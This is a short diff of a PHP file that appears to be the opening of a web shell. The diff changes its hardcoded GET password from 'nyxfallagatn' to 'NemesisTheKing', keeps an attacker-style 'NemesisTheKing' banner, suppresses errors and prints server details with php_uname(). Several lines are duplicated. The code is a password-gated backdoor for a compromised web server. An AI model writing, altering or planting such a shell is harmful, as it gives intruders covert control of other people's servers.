@@ -1,8 +1,8 @@
 <?php 
 error_reporting(E_ERROR | E_PARSE);
 error_reporting(E_ERROR | E_PARSE);
-if ($_GET["pass"] == "nyxfallagatn"){
-if ($_GET["pass"] == "nyxfallagatn"){
+if ($_GET["pass"] == "NemesisTheKing"){
+if ($_GET["pass"] == "NemesisTheKing"){
 echo "NemesisTheKing";
 echo "<b>NemesisTheKing</b><br>";
 echo '<b>System Info:</b> '.php_uname();
